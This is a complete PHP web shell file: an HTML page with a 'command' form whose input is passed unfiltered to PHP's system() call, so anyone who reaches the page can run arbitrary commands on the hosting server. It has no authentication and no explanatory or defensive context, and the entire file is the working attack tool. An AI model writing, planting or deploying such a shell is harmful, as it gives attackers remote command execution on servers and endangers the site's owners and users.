<html>
<title>Web Shell</title>
<meta charset="UTF-8" />

<body>
    <div align="center">
        <form action="#" method="GET">
            <label for="cmd">Enter command: </label>
            <input type="text" name="cmd" placeholder="command" />
            <input type="submit" name="cmd_submit" value="Enter" />
        </form>
        <?php
        if (isset($_GET['cmd'])) {
            $lastline = system($_GET['cmd'], $result);
            if ($result == 1)
                print("Command: " . $_GET['cmd'] . " failed");
        }
        ?>
    </div>
</body>

</html>